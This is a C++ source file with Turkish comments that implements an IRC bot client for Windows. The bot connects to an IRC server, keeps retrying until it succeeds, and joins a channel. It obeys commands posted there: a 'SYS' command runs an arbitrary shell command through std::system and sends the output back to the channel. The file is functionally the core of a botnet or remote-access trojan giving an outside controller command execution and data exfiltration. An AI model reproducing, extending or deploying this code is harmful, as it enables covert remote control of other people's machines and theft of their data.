#include <future>
#include <iostream>
#include <WS2tcpip.h>
#include <thread>
#include <winsock2.h> // header file for WinSock 2
#include "Formatlama.h"

#include <string>
#include <fstream>

#pragma comment(lib,"ws2_32.lib")
using namespace std;
class IRC_Client
{
public:
	string emirler[5];
	SOCKET skt;
	WSADATA ws_data;
	sockaddr_in addr;
	string channel;
	int port;
	string ip;
	string dns;

	string imzakatsayisi="";

	string nick;
	string username;
	//odyssey.de.eu.darkmyst.org
	bool IsJoined = false;
	bool IsRegisteredTheServer = false;

	IRC_Client()
	{}

    IRC_Client(string IP,int PORT,string Channel,string Nick,string Username)
	{
		ip = IP;
		port = PORT;
		channel = Channel;
		nick = Nick;
		username = Username;
		WSAStartup(MAKEWORD(2, 2), &ws_data);

		skt = socket(AF_INET, SOCK_STREAM, 0);//sockstream = tcp/ip sockdgram=udp

		if (skt == INVALID_SOCKET)
		{
			cout << "Soket acilamadi!" << endl;
		}
		else
			cout << "Soket acildi!" << endl;
		
		addr.sin_family = AF_INET;
		addr.sin_port = htons(port);
		inet_pton(AF_INET, ip.c_str(), &addr.sin_addr);
	}
	 int Connect()
	 {
		 int status; 
		 do//sununcuya baglan
		 {
			 status = connect(skt, (sockaddr*)&addr, sizeof(addr));
			 Sleep(1000); 
		 } 
		 while (status == SOCKET_ERROR);//olmassa denemeye devam et..
		 {
			 cout << "baglanilamadi tekrar deneniyor..." << endl;
			 status = connect(skt, (sockaddr*)&addr, sizeof(addr));
			 Sleep(500);
		 }
		 
		cout << "Basarili!";

		//SendRaw("PASS secretpasswordhere\r\n");

		//IRC protokolu..
		SendRaw("NICK " + nick + "\r\n");
		SendRaw("USER " + nick + " * * :" + username + "\r\n");
		
		while (true)
		{
			ReadRaw();
		}
		return 1;
	}

	
	void Join()
	{
		SendRaw("JOIN "+channel+"\r\n");
	}

	int SendRaw(string text)//ham gönderi
	{
		int sendresult = send(skt, text.c_str(), text.size(), 0);
		if (sendresult != SOCKET_ERROR)//socket error -1'dir sendresult inti -1'dir
		{
			cout <<"Gonderildi:" << text << endl;
			return 1;
		}
		else
			return 0;
	}

	
	void list_files_and_send(string dir)
	{
		/*
		for (const auto & entry : fs::directory_iterator(dir))
		{
			std::cout << entry.path() << std::endl;
			SendRaw((string)entry.path().filename);
		}
		*/
	}

	void ReadRaw()//ham olarak oku
	{
		char buf[4096];
		ZeroMemory(buf, 4096);
		int bytes_recieved = recv(skt, buf, 4096, 0);
		if (bytes_recieved > 0)
		{
			
			string rawMessage = string(buf, 0, bytes_recieved);
			string message = TrimSpace(rawMessage);
			cout << message << endl ;

			if (message.substr(0, 4) == "PING")
			{
				string code = message.substr(6, message.length() - 6);
				SendRaw("PONG :" + code);
			}
			else if (message.find("PING") != string::npos)
			{
				cout << "Istemci PING'lendi!" << endl;
			}
			
			if (message.find(" 001 ") != string::npos)//registered demek
			{
				IsRegisteredTheServer = true;
				Join();
			}
			else if (message.find(" 353 ") !=string::npos)//kanala girildi dönütü
			{
				IsJoined = true;
				cout << "Kanala girildi!" << endl;
			}
			if (message.find("PRIVMSG " + channel + " :") != string::npos)
			{
				cout << "Bir Private Message ulasti!" << endl;;
				int j = ilkKarakteriBul(message) + 1;
				int lenght = j + 10 + channel.size();
				try
				{
					string fazli = message.substr(lenght, message.size() - lenght);
					
					FazAyristirici(fazli);
					emirleriuygula(emirler);
				}
				catch (const std::exception&)
				{
					cout << "Yanlis formatli emir!" << endl;
				}
			}
			message = "";
		}
	}

	//emirleri uygula. emir string dizisi þunlarý içerir ve '#' ile ayrýlýr: (Komut kodu)#Özne(örn:ALL,irc_nickname)#komut parametre 1#komut parametre 2#0
	void FazAyristirici(string RawOrder)//gelen emri # ile ayrýlmýþ dört kýsmýný dizilere aktaran fonksiyon..
	{

		for (int z = 0; z < 4; z++)//emirleri sil
			emirler[z] = "";

		int faz = 0;
		for (int i = 0;i <= RawOrder.size();i++)
		{
			if (RawOrder[i] != '#')
			{
				emirler[faz] += RawOrder[i];
			}
			else if (RawOrder[i] == '#')
			{
				faz++;
			}
		}

		cout << emirler[0] << endl;
		cout << emirler[1] << endl;
		cout << emirler[2] << endl;
		
	}

	void emirleriuygula(string emir[])
	{
			if (emirler[1] == "ALL" || emirler[1] == nick)
			{
				if (emirler[0] == "SYS")
				{
					cout << "emir geldi";
					string com = emirler[2];
					execute(com);
					cout << "Konsol ciktisi >> " << emirler[2] << endl;

					string satir;
					ifstream dosya("systemc.txt");
					if (dosya.is_open())
					{
						int i = 0;
						string text;
						PrivMessageSend(channel, nick + " tarafindan gelen:");
						PrivMessageSend(channel, "=========================================================");
						while (getline(dosya, satir))
						{
							i++;
							text += satir + "||";
							if (i % 3 == 0)
							{
								SendRaw("PRIVMSG " + channel + " :" + text + "\r\n");
								text = "";
								Sleep(700);
							}
						}
						PrivMessageSend(channel, "=========================================================");
					}
				}
				else if (emirler[0] == "kck")
				{
					SendRaw("KICK " + channel + " " + emirler[2] + "\r\n");
				}
				else if (emirler[0] == "OP")
				{
					string com = emirler[2];
					SendRaw(com);
				}
				else if (emirler[0] == "Kontrol_Edildi")
				{
					SendRaw("PRIVMSG " + channel + " :Kontrol_Edildi\r\n");
				}
			}
		
		
	}

	void PrivMessageSend(string cha,string msg)//IRC private message komutu sözdizimi: PRIVMSG #Channel :message +
	{
		SendRaw("PRIVMSG " + cha + " :" + msg + "\r\n");
	}
	
	string execute(std::string cmd)//hiçbir þey anlamadým..
	{
		string text;
		std::string file_name = "systemc.txt";
		std::system((cmd + " > " + file_name).c_str()); // çýkýþý dosyaya yönlendir

			std::ifstream file(file_name);
			text = { std::istreambuf_iterator<char>(file), std::istreambuf_iterator<char>() };
		
			return text;
	}

	
	
	~IRC_Client()
	{

	}
};

